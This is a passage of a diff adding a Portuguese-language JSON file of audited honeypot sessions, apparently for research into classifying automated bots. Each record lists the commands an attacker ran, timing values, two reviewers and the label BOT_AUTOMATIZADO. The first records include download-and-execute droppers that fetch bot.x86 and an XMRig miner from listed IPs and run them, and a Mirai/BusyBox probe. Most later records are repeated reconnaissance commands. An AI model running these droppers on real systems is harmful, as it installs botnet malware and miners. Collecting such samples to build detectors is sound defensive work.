+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_048",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_049",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_050",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_single_001",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_002",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_003",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_004",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_005",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_006",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_007",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_008",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_009",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_010",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_011",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_012",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_013",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_014",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_015",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_016",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_017",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_018",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_019",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_020",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_021",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_022",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_023",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_024",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_025",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_026",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_027",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_028",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_029",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_030",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_031",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_032",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_033",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_034",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_035",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_036",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_037",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_038",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_039",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_040",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_041",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_042",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_043",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_044",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_045",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_046",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    },
+    {
+      "amostra_id": "l1_single_047",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ],
+      "duracao_segundos": 0.95,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de leitura de CPU (/proc/cpuinfo)"
+    },
+    {
+      "amostra_id": "l1_single_048",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -a"
+      ],
+      "duracao_segundos": 0.5,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de versão de kernel (uname -a)"
+    },
+    {
+      "amostra_id": "l1_single_049",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ],
+      "duracao_segundos": 0.65,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de comando único (uname)"
+    },
+    {
+      "amostra_id": "l1_single_050",
+      "estrato": "Scanner de comando único repetido",
+      "comandos": [
+        "echo xsec"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Scanner automatizado de verificação de eco (echo xsec)"
+    }
+  ]
+}
